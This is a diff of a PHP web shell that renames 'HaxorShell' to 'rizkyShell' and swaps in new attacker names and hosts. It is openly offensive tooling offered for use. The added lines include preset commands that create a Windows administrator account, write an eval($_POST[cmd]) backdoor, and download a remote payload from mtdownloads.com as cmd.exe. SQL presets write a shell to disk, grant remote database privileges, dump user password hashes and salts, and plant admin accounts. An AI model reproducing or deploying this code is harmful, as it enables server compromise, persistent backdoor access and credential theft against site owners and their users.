@@ -422,7 +422,7 @@ if (isset($_POST['go'])) {
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}.tables tr:hover td {background-color: #EEE685;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
 $sitename = $_SERVER['SERVER_NAME'];
-echo $sitename .' | HaxorShell';
+echo $sitename .' | rizkyShell';
 ?>
 </title></head><body><div class="main"><div class="outl"><div class="toptag"><?php 
 echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - [uid(' . getmyuid() . ') gid(' . getmygid() . ')]';
@@ -487,9 +487,9 @@ switch ($_POST['go']) {
         echo '</select> ';
         echo '<select onchange="$(\'cmd\').value=options[selectedIndex].value">';
         echo '<option>---CMD Executor---</option>';
-        echo '<option value="echo ' . htmlspecialchars('"<?php phpinfo();?>"') . ' >> ' . THISDIR . 'haxorid.txt">Write File</option>';
+        echo '<option value="echo ' . htmlspecialchars('"<?php phpinfo();?>"') . ' >> ' . THISDIR . 'sitemap.txt">Write File</option>';
         echo '<option value="whoami">Who Am I</option>';
-        echo '<option value="net user sysadmin R00t@willy16 /add">Add User (Win)</option>';
+        echo '<option value="net user sysadmin R00t@rizky /add">Add User (Win)</option>';
         echo '<option value="net localgroup administrators sysadmin /add">Add Group (Win)</option>';
         echo '<option value="netstat -an">View Port (Win)</option>';
         echo '<option value="ipconfig /all">View Address (Win)</option>';
@@ -585,11 +585,11 @@ switch ($_POST['go']) {
         echo '<div class="actall"><p><textarea name="phpcode" id="phpcode" style="width:698px;height:180px;">' . htmlspecialchars($phpcode) . '</textarea></p><p>';
         echo '<select onchange="$(\'phpcode\').value=options[selectedIndex].value">';
         echo '<option>---Common Code---</option>';
-        echo '<option value="echo readfile(\'C:/web/haxor.php\');">Read file</option>';
-        echo '<option value="$fp=fopen(\'C:/web/haxor.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">Write file</option>';
-        echo '<option value="echo copy(\'C:/web/mi77i.php\',\'C:/web/haxor.php\')?\'Success!\':\'Fail!\';">Copy files</option>';
-        echo '<option value="echo chmod(\'C:/web/mi77i.php\',0777)?\'Success!\':\'Fail!\';">Modify properties</option>';
-        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'http://hax.or.id/indo.txt\'))?\'Success!\':\'Fail!\';">Remote download</option>';
+        echo '<option value="echo readfile(\'C:/web/admin.php\');">Read file</option>';
+        echo '<option value="$fp=fopen(\'C:/web/admin.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">Write file</option>';
+        echo '<option value="echo copy(\'C:/web/admin.php\',\'C:/web/config.php\')?\'Success!\':\'Fail!\';">Copy files</option>';
+        echo '<option value="echo chmod(\'C:/web/admin.php\',0777)?\'Success!\':\'Fail!\';">Modify properties</option>';
+        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'https://mtdownloads.com/storage/alfapw.txt\'))?\'Success!\':\'Fail!\';">Remote download</option>';
         echo '<option value="print_r($_SERVER);">Environment variable</option>';
         echo '</select> ';
         echo '<input type="submit" style="width:80px;" value="Go"></p></div>';
@@ -777,15 +777,15 @@ switch ($_POST['go']) {
         echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">Write file</option>';
         echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \'' . $sqluser . '\'@\'%\' IDENTIFIED BY \'' . $sqlpass . '\' WITH GRANT OPTION;">Open external connection</option>';
         echo '<option value="show variables;">System variable</option>';
-        echo '<option value="create database haxor;">Create database</option>';
-        echo '<option value="create table `haxor` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">Create data table</option>';
+        echo '<option value="create database rizky;">Create database</option>';
+        echo '<option value="create table `rizky` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">Create data table</option>';
         echo '<option value="show databases;">Show database</option>';
         echo '<option value="show tables from `' . $sqlname . '`;">Show data sheet</option>';
-        echo '<option value="show columns from `haxor`;">Show table structure</option>';
-        echo '<option value="drop table `haxor`;">Delete data table</option>';
+        echo '<option value="show columns from `rizky`;">Show table structure</option>';
+        echo '<option value="drop table `rizky`;">Delete data table</option>';
         echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">Display field</option>';
-        echo '<option value="insert into `admin` (`user`,`pass`) values (\'haxor\', \'f1a81d782dea6a19bdca383bffe68452\');">Insert data</option>';
-        echo '<option value="update `admin` set `user` = \'mi77i\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'haxor\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">Change data</option>';
+        echo '<option value="insert into `admin` (`user`,`pass`) values (\'rizky\', \'f1a81d782dea6a19bdca383bffe68452\');">Insert data</option>';
+        echo '<option value="update `admin` set `user` = \'rizky\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'rizky\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">Change data</option>';
         echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \'' . THISDIR . 'out.txt\';">Off the DB (MySql)</option>';
         echo '</select>';
         echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">' . htmlspecialchars($sqlcode) . '</textarea></td></tr>';
@@ -1050,7 +1050,7 @@ switch ($_POST['go']) {
         echo '</select></form></div><div class="actall">';
         echo '<input type="button" value="New file" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
         echo '<input type="button" value="New Dir" onclick="txts(\'Directory name\',\'newdir\',\'e\');" style="width:68px;"> ';
-        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'http://hax.or.id/indo.txt\',\'f\');" style="width:68px;"> ';
+        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'https://mtdownloads.com/storage/alfapw.txt\',\'f\');" style="width:68px;"> ';
         echo '<input type="button" value="Bulk Up" onclick="go(\'upfiles\',\'' . $nowdir . '\');" style="width:68px;"> ';
         echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
         subeval();
